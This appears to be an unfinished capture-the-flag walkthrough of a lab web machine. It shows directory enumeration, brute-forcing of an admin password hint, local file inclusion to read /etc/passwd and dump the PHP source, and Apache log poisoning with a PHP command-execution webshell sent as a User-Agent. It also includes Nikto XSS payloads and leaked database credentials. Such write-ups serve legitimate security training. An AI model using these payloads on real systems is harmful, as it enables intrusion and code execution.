+ OSVDB-4598: /test.php/members.asp?SF=%22;}alert(223344);function%20x(){v%20=%22: Web Wiz Forums ver. 7.01 and below is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.

+ OSVDB-4015: /test.php/jigsaw/: Jigsaw server may be installed. Versions lower than 2.2.1 are vulnerable to Cross Site Scripting (XSS) in the error page.

+ OSVDB-2754: /test.php/guestbook/?number=5&lng=%3Cscript%3Ealert(document.domain);%3C/script%3E: MPM Guestbook 1.2 and previous are vulnreable to XSS attacks.

+ OSVDB-2946: /test.php/forum_members.asp?find=%22;}alert(9823);function%20x(){v%20=%22: Web Wiz Forums ver. 7.01 and below is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.

+ /test.php/anthill/login.php: Anthill bug tracking system may be installed. Versions lower than 0.1.6.1 allow XSS/HTML injection and may allow users to bypass login requirements. http://anthill.vmlinuz.ca/ and http://www.cert.org/advisories/CA-2000-02.html

+ /test.php/cfdocs/expeval/sendmail.cfm: Can be used to send email; go to the page and fill in the form

+ OSVDB-22: /test.php/cgi-bin/bigconf.cgi: BigIP Configuration CGI

+ /test.php/ammerum/: Ammerum pre 0.6-1 had several security issues.

+ /test.php/ariadne/: Ariadne pre 2.1.2 has several vulnerabilities. The default login/pass to the admin page is admin/muze.

+ /test.php/cbms/cbmsfoot.php: CBMS Billing Management has had many vulnerabilities in versions 0.7.1 and below. None could be confirmed here, but they should be manually checked if possible. http://freshmeat.net/projects/cbms/

+ /test.php/cbms/changepass.php: CBMS Billing Management has had many vulnerabilities in versions 0.7.1 and below. None could be confirmed here, but they should be manually checked if possible. http://freshmeat.net/projects/cbms/

+ /test.php/cbms/editclient.php: CBMS Billing Management has had many vulnerabilities in versions 0.7.1 and below. None could be confirmed here, but they should be manually checked if possible. http://freshmeat.net/projects/cbms/

+ /test.php/cbms/passgen.php: CBMS Billing Management has had many vulnerabilities in versions 0.7.1 and below. None could be confirmed here, but they should be manually checked if possible. http://freshmeat.net/projects/cbms/

+ /test.php/cbms/realinv.php: CBMS Billing Management has had many vulnerabilities in versions 0.7.1 and below. None could be confirmed here, but they should be manually checked if possible. http://freshmeat.net/projects/cbms/

+ /test.php/cbms/usersetup.php: CBMS Billing Management has had many vulnerabilities in versions 0.7.1 and below. None could be confirmed here, but they should be manually checked if possible. http://freshmeat.net/projects/cbms/

+ /test.php/ext.dll?MfcIsapiCommand=LoadPage&page=admin.hts%20&a0=add&a1=root&a2=%5C: This check (A) sets up the next bad blue test (B) for possible exploit. See http://www.badblue.com/down.htm

...

```







<h2 align="center">Directory and File Enumeration</h2>



```bash
:~/challenge# gobuster dir -u http://10.65.175.77/ -w /usr/share/dirb/wordlists/common.txt -t 60 -q -x php,html --exclude-length 277
/dashboard.php        (Status: 302) [Size: 922] [--> index.php]
/detail.php           (Status: 302) [Size: 1103] [--> index.php]
/index.html           (Status: 200) [Size: 503]
/index.html           (Status: 200) [Size: 503]
/index.php            (Status: 200) [Size: 2372]
/index.php            (Status: 200) [Size: 2372]
/logout.php           (Status: 200) [Size: 54]
/news.php             (Status: 302) [Size: 922] [--> index.php]
/register.php         (Status: 200) [Size: 2334]
/test.php             (Status: 200) [Size: 72888]
```

```bash
:~/challenge# gobuster dir -u http://10.65.175.77/ -w /usr/share/dirb/wordlists/common.txt -x php,htmls,txt -t 60 -q --exclude-length 277
/dashboard.php        (Status: 302) [Size: 922] [--> index.php]
/detail.php           (Status: 302) [Size: 1103] [--> index.php]
/index.html           (Status: 200) [Size: 503]
/index.php            (Status: 200) [Size: 2372]
/index.php            (Status: 200) [Size: 2372]
/logout.php           (Status: 200) [Size: 54]
/news.php             (Status: 302) [Size: 922] [--> index.php]
/note.txt             (Status: 200) [Size: 121]
/register.php         (Status: 200) [Size: 2334]
/test.php             (Status: 200) [Size: 72888]
```

```bash
:~/challenge# printf "%s\n" {00..99} > list.txt
```

```bash
:~/challenge# apt update && apt install -y python3-pip && pip3 install wfuzz
```

```bash
:~/challenge# pip3 install wfuzz --break-system-packages
```

```bash
:~/challenge# wfuzz --version
```

```bash
ffuf -w list.txt -d "username=admin&password=adminFUZZadmin&submit=Submit" -X POST -u http://10.65.148.190/index.php -t 1 -p 20
wfuzz -c -z range,00-99 -d "username=admin&password=adminFUZZadmin&submit=Submit" -X POST -u http://10.10.X.X/index.php -t 1 -s 20

```



```bash
:~/challenge# gobuster dir -u http://10.65.148.190/~files/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt -x txt,php -t 60 --exclude-length 278
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.65.148.190/
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt
[+] Negative Status codes:   404
[+] Exclude Length:          278
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/register.php         (Status: 200) [Size: 2334]
/logout.php           (Status: 200) [Size: 54]
/news.php             (Status: 302) [Size: 922] [--> index.php]
/test.php             (Status: 200) [Size: 72897]
/index.php            (Status: 200) [Size: 2372]
/dashboard.php        (Status: 302) [Size: 922] [--> index.php]
/detail.php           (Status: 302) [Size: 1103] [--> index.php]
/note.txt             (Status: 200) [Size: 121]
Progress: 67360 / 186828 (36.05%)[ERROR] parse "http://10.65.148.190/besalu\t.txt": net/url: invalid control character in URL
[ERROR] parse "http://10.65.148.190/besalu\t.php": net/url: invalid control character in URL
Progress: 70087 / 186828 (37.51%)[ERROR] parse "http://10.65.148.190/error\x1f_log": net/url: invalid control character in URL
[ERROR] parse "http://10.65.148.190/error\x1f_log.txt": net/url: invalid control character in URL
[ERROR] parse "http://10.65.148.190/error\x1f_log.php": net/url: invalid control character in URL
/index.php            (Status: 200) [Size: 2372]
/~files               (Status: 301) [Size: 315] [--> http://10.65.148.190/~files/]
Progress: 186825 / 186828 (100.00%)
===============================================================
Finished
===============================================================
```



``bash
:~/challenge# curl http://10.65.175.77/note.txt
Message from admin :-

I can't remember my password always , that's why I have saved it in /home/files/pass.txt file .
```

```bash
:~/challenge# pip3 install html2text
```

```bash
:~/challenge# curl http://10.65.175.77/test.php | html2text > test.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 72852    0 72852    0     0   197k      0 --:--:-- --:--:-- --:--:--  197k
```

```bash
:~/challenge# grep -i "/var/www/" test.txt
DOCUMENT_ROOT | /var/www/html   
CONTEXT_DOCUMENT_ROOT | /var/www/html   
SCRIPT_FILENAME | /var/www/html/test.php   
$_SERVER['DOCUMENT_ROOT']| /var/www/html  
$_SERVER['CONTEXT_DOCUMENT_ROOT']| /var/www/html  
$_SERVER['SCRIPT_FILENAME']| /var/www/html/test.php  
```

```bash
:~/challenge# grep -i "SERVER" test.txt
Server API | Apache 2.0 Handler   
Server Administrator | webmaster@localhost   
Virtual Server | Yes   
Server Root | /etc/apache2   
SERVER_SIGNATURE | <address>Apache/2.4.41 (Ubuntu) Server at 10.65.175.77 Port 80</address>  
SERVER_SOFTWARE | Apache/2.4.41 (Ubuntu)   
SERVER_NAME | 10.65.175.77   
SERVER_ADDR | 10.65.175.77   
SERVER_PORT | 80   
SERVER_ADMIN | webmaster@localhost   
SERVER_PROTOCOL | HTTP/1.1   
Interfaces | OuterIterator, RecursiveIterator, SeekableIterator, SplObserver, SplSubject   
$_SERVER['HTTP_HOST']| 10.65.175.77  
$_SERVER['HTTP_USER_AGENT']| curl/8.5.0  
$_SERVER['HTTP_ACCEPT']| */*  
$_SERVER['PATH']|
$_SERVER['SERVER_SIGNATURE']| <address>Apache/2.4.41 (Ubuntu) Server at
$_SERVER['SERVER_SOFTWARE']| Apache/2.4.41 (Ubuntu)  
$_SERVER['SERVER_NAME']| 10.65.175.77  
$_SERVER['SERVER_ADDR']| 10.65.175.77  
$_SERVER['SERVER_PORT']| 80  
$_SERVER['REMOTE_ADDR']| 10.65.115.1  
$_SERVER['DOCUMENT_ROOT']| /var/www/html  
$_SERVER['REQUEST_SCHEME']| http  
$_SERVER['CONTEXT_PREFIX']| _no value_  
$_SERVER['CONTEXT_DOCUMENT_ROOT']| /var/www/html  
$_SERVER['SERVER_ADMIN']| webmaster@localhost  
$_SERVER['SCRIPT_FILENAME']| /var/www/html/test.php  
$_SERVER['REMOTE_PORT']| 36480  
$_SERVER['GATEWAY_INTERFACE']| CGI/1.1  
$_SERVER['SERVER_PROTOCOL']| HTTP/1.1  
$_SERVER['REQUEST_METHOD']| GET  
$_SERVER['QUERY_STRING']| _no value_  
$_SERVER['REQUEST_URI']| /test.php  
$_SERVER['SCRIPT_NAME']| /test.php  
$_SERVER['PHP_SELF']| /test.php  
$_SERVER['REQUEST_TIME_FLOAT']| 1773602644.143  
$_SERVER['REQUEST_TIME']| 1773602644  
```

<p>

- Navigate to http://MachineIP/~files/</p>

<p><code>Image 1</code></p>

<p> 

- Click <code>pass.txt</code></p>



```bash
Admin password hint :-

admin__admin

" __ means two numbers are there , this hint is enough I think :) "
```

<p><code>Image 2</code></p>

<br>
<br>
<br>
<p>

- Register:http://MachineIP/register.php</p>

<p><code>Image 3</code></p>


<br>
<br>
<br>
<p>

- Log in: http://MachineIP/index.php</p>

<p><code>Image 4</code></p>


<br>
<br>
<br>
<p>

- Inspect HTTP history in Burp Suite</p>

<p><code>Image 5</code></p>

<br>
<br>
<br>
<p>

- Send Request to Intruder<br>
- Add <code>admin</code> as username<br>
- Add <code>admin&a&admin</code><br>
- Select <code>Simple list</code> as Payload type<br>
- Click <code>Load...</code><br>
- Browse and Open the <code>list.txt</code> created previously<br>
- Click <code>Start attack/code></p>


<p><code>Image6</code></p>

<br>
<br>
<br>
<p>

- Check the <strong>Results</strong></p>

<p><code>Image7</code></p>

<br>
<br>
<br>
<p>

- Log out<br>
- Log in as <code>admin</code> and the password just discovered</p>

<p><code>Image8</code></p>

<br>
<br>
<br>
<p>

- Select <code>Details</code></p>

<p><code>Image9</code></p>

<br>
<br>
<br>
<p>

- Enter <code>admin</code><br>
- Hit <code>whoami</code></p>

<p><code>Image10</code></p>

<br>
<br>
<br>
<p>

- Check Burp Suite´s HTTP history<br>
- Identify that <code>dashboard.php</code> is active</p>


<br>
<br>
<br>
<p>

- http://MachineIP/detail.php?page=index.html</p>

<p><code>Image11</code></p>


<br>
<br>
<br>
<p>

- Navigate to <code>http://safezone.thm/detail.php?page=index.html</code><br>
- Navigate to <code>http://safezone.thm/detail.php?page=/etc/passwd</code><br>
- Discover users <code>root</code>, <code>files</code>, and <code>ubuntu</code></p>

<p><code>Image13</code></p>

<br>
<br>
<br>
<p>

- .....</p>


<p><code>Image13</code></p>


```bash
http://safezone.thm/detail.php?page=php://filter/convert.base64-encode/resource=detail.php 
```

<p><code>Image13</code></p>

```bash
php://filter/convert.base64-encode/resource=detail.phpPCFET0NUWVBFIGh0bWw+DQo8aHRtbD4NCjxoZWFkPg0KDQo8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9InN0eWxlLmNzcyI+DQoNCjx0aXRsZT5VU0VSPC90aXRsZT4NCjxzdHlsZT4NCg0KLmF2YXRhciB7DQogICBtYXJnaW4tbGVmdDoxMHB4Ow0KICAgbWFyZ2luLXRvcDo4MHB4Ow0KICAgdmVydGljYWwtYWxpZ246IG1pZGRsZTsNCiAgIHdpZHRoOiA1MHB4Ow0KICAgaGVpZ2h0OiA1MHB4Ow0KICAgYm9yZGVyLXJhZGl1czogNTAlOw0KICAgYm9yZGVyOjNweCBzb2xpZCBibGFjazsNCn0NCnVsIHsNCiAgbGlzdC1zdHlsZS10eXBlOiBub25lOw0KICBtYXJnaW46IDA7DQogIHBhZGRpbmc6IDA7DQogIG92ZXJmbG93OiBoaWRkZW47DQogIGJhY2tncm91bmQtY29sb3I6ICMzMzM7DQp9DQoNCmxpIHsNCiAgZmxvYXQ6IGxlZnQ7DQp9DQoNCmxpIGEgew0KICBkaXNwbGF5OiBibG9jazsNCiAgY29sb3I6IHdoaXRlOw0KICB0ZXh0LWFsaWduOiBjZW50ZXI7DQogIHBhZGRpbmc6IDE0cHggMTZweDsNCiAgdGV4dC1kZWNvcmF0aW9uOiBub25lOw0KfQ0KDQpsaSBhOmhvdmVyIHsNCiAgYmFja2dyb3VuZC1jb2xvcjogIzExMTsNCg0KDQp9DQo8L3N0eWxlPg0KDQo8L2hlYWQ+DQo8Ym9keSBzdHlsZT0iYmFja2dyb3VuZC1jb2xvcjpibGFjayI+DQo8dWw+DQogIDxsaT48YSBjbGFzcz0iYWN0aXZlIiBocmVmPSJkYXNoYm9hcmQucGhwIj5Ib21lPC9hPjwvbGk+DQogIDxsaT48YSBocmVmPSJuZXdzLnBocCI+TmV3czwvYT48L2xpPg0KICA8bGk+PGEgaHJlZj0iY29udGFjdC5waHAiPkNvbnRhY3Q8L2E+PC9saT4NCiAgPGxpPjxhIGhyZWY9ImRldGFpbC5waHAiPkRldGFpbHM8L2E+PC9saT4NCiAgPGxpPjxhIGhyZWY9ImxvZ291dC5waHAiPkxvZ291dDwvYT48L2xpPg0KPC91bD4NCg0KDQo8YnI+PGJyPjxicj48YnI+PGJyPg0KPC9ib2R5Pg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCjwhLS0gdHJ5IHRvIHVzZSAicGFnZSIgYXMgR0VUIHBhcmFtZXRlci0tPg0KPC9odG1sPg0KDQo8P3BocA0KJGNvbj1teXNxbGlfY29ubmVjdCgibG9jYWxob3N0Iiwicm9vdCIsIm15cm9vdHBhc3MiLCJkYiIpOw0Kc2Vzc2lvbl9zdGFydCgpOw0KaWYoaXNzZXQoJF9TRVNTSU9OWydJU19MT0dJTiddKSkNCnsNCiRpc19hZG1pbj0kX1NFU1NJT05bJ2lzYWRtaW4nXTsNCmVjaG8gIjxoMiBzdHlsZT0nY29sb3I6VG9tYXRvO21hcmdpbi1sZWZ0OjEwMHB4O21hcmdpbi10b3A6LTgwcHgnPkZpbmQgb3V0IHdobyB5b3UgYXJlIDopIDwvaDI+IjsNCmVjaG8gIjxicj48YnI+PGJyPiI7DQppZigkaXNfYWRtaW49PT0idHJ1ZSIpDQp7DQplY2hvICc8ZGl2IHN0eWxlPSJhbGlnbjpjZW50ZXI7IiBjbGFzcz0iZGl2ZiI+JzsNCmVjaG8gJzxmb3JtIGNsYXNzPSJib3giIG1ldGhvZD0iUE9TVCIgc3R5bGU9InRleHQtYWxpZ246Y2VudGVyIj4nOw0KZWNobyAnPGlucHV0IHJlcXVpcmVkIEFVVE9DT01QTEVURT0iT0ZGIiBzdHlsZT0idGV4dC1hbGlnbjpjZW50ZXI7IiB0eXBlPSJ0ZXh0IiBwbGFjZWhvbGRlcj0idXNlciIgbmFtZT0ibmFtZSI+PGJyPjxicj4nOw0KZWNobyAnPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9Indob2FtaSIgbmFtZT0ic3ViIj4nOw0KZWNobyAnPC9mb3JtPic7DQplY2hvICc8L2Rpdj4nOw0KaWYoaXNzZXQoJF9HRVRbInBhZ2UiXSkpDQp7DQoJCSRwYWdlPSRfR0VUWyJwYWdlIl07DQoJCSRmaWxlID0gc3RyX3JlcGxhY2UoYXJyYXkoICIuLi8iLCAiLi5cIiIgKSwgIiIsICRwYWdlICk7DQoJCWVjaG8gJGZpbGU7DQoJCWluY2x1ZGUoJGZpbGUpOw0KfQ0KJGZvcm11c2VyPW15c3FsaV9yZWFsX2VzY2FwZV9zdHJpbmcoJGNvbiwkX1BPU1RbJ25hbWUnXSk7DQppZihpc3NldCgkX1BPU1RbJ3N1YiddKSkNCgl7DQoJCSRzcWw9InNlbGVjdCAqIGZyb20gdXNlciB3aGVyZSB1c2VybmFtZT0nJGZvcm11c2VyJyI7DQogICAgICAgICAgICAgICAgJGRldGFpbHMgPSBteXNxbGlfZmV0Y2hfYXNzb2MobXlzcWxpX3F1ZXJ5KCRjb24sJHNxbCkpOw0KCQkkZGV0PWpzb25fZW5jb2RlKCRkZXRhaWxzKTsNCgkJZWNobyAiPHByZSBzdHlsZT0nY29sb3I6cmVkO2ZvbnQtc2l6ZToxNHB4Jz4kZGV0PC9wcmU+IjsNCgkJJG1zZz0iRGV0YWlscyBhcmUgc2F2ZWQgaW4gYSBmaWxlIjsNCgkJZWNobyAiPHNjcmlwdD5hbGVydCgnZGV0YWlscyBzYXZlZCBpbiBhIGZpbGUnKTwvc2NyaXB0PiI7DQoJfQ0KfQ0KZWxzZQ0Kew0KZWNobyAiPGgzIHN0eWxlPSdjb2xvcjpyZWQ7dGV4dC1hbGlnbjpjZW50ZXInPllvdSBjYW4ndCBhY2Nlc3MgdGhpcyBmZWF0dXJlISc8L2gzPiI7DQp9DQp9DQplbHNlDQp7DQpoZWFkZXIoJ0xvY2F0aW9uOiBpbmRleC5waHAnKTsNCn0NCg0KPz4NCg==
```

<p>

- Use <code>CyberChef</code></p>


```bash
<!DOCTYPE html>
<html>
<head>

<link rel="stylesheet" href="style.css">

<title>USER</title>
<style>

.avatar {
   margin-left:10px;
   margin-top:80px;
   vertical-align: middle;
   width: 50px;
   height: 50px;
   border-radius: 50%;
   border:3px solid black;
}
ul {
  list-style-type: none;
  margin: 0;
  padding: 0;
  overflow: hidden;
  background-color: #333;
}

li {
  float: left;
}

li a {
  display: block;
  color: white;
  text-align: center;
  padding: 14px 16px;
  text-decoration: none;
}

li a:hover {
  background-color: #111;
}

</style>
</head>
<body style="background-color:black">
<ul>
  <li><a class="active" href="dashboard.php">Home</a></li>
  <li><a href="news.php">News</a></li>
  <li><a href="contact.php">Contact</a></li>
  <li><a href="detail.php">Details</a></li>
  <li><a href="logout.php">Logout</a></li>
</ul>

<br><br><br><br><br>
</body>

<!-- try to use "page" as GET parameter-->
</html>
<?php
$con=mysqli_connect("localhost","root","myrootpass","db");
session_start();
if(isset($_SESSION['IS_LOGIN']))
{
$is_admin=$_SESSION['isadmin'];
echo "<h2 style='color:Tomato;margin-left:100px;margin-top:-80px'>Find out who you are :) </h2>";
echo "<br><br><br>";
if($is_admin==="true")
{
echo '<div style="align:center;" class="divf">';
echo '<form class="box" method="POST" style="text-align:center">';
echo '<input required AUTOCOMPLETE="OFF" style="text-align:center;" type="text" placeholder="user" name="name"><br><br>';
echo '<input type="submit" value="whoami" name="sub">';
echo '</form>';
echo '</div>';
if(isset($_GET["page"]))
{
$page=$_GET["page"];
$file = str_replace(array( "../", "..\"" ), "", $page );
echo $file;
include($file);
}
$formuser=mysqli_real_escape_string($con,$_POST['name']);
if(isset($_POST['sub']))
{
$sql="select * from user where username='$formuser'";
                $details = mysqli_fetch_assoc(mysqli_query($con,$sql));
$det=json_encode($details);
echo "<pre style='color:red;font-size:14px'>$det</pre>";
$msg="Details are saved in a file";
echo "<script>alert('details saved in a file')</script>";
}
}
else
{
echo "<h3 style='color:red;text-align:center'>You can't access this feature!'</h3>";
}
}
else
{
header('Location: index.php');
}
?>
```


```bash
http://target.thm/detail.php?page=/var/log/apache2/access.log
```

```bash
http://10.65.148.190/detail.php?page=php://filter/convert.base64-encode/resource=/var/log/apache2/access.log
```





```bash
:~/challenge# curl -A '<?php echo exec($_GET[cmd]) ; ?>' http://10.65.148.190
<html>
<title>Whoami?</title>

<body style="background-color:black">
<pre style="color:#737CA1;font-size:14px">

   _____       ____                          

  / ___/____ _/ __/__  ____  ____  ____  ___ 

  \__ \/ __ `/ /_/ _ \/_  / / __ \/ __ \/ _ \

___/ / /_/ / __/  __/ / /_/ /_/ / / / /  __/

/____/\__,_/_/  \___/ /___/\____/_/ /_/\___/ 

                                            Designed by cyberbot :)


</pre>



</body>








```
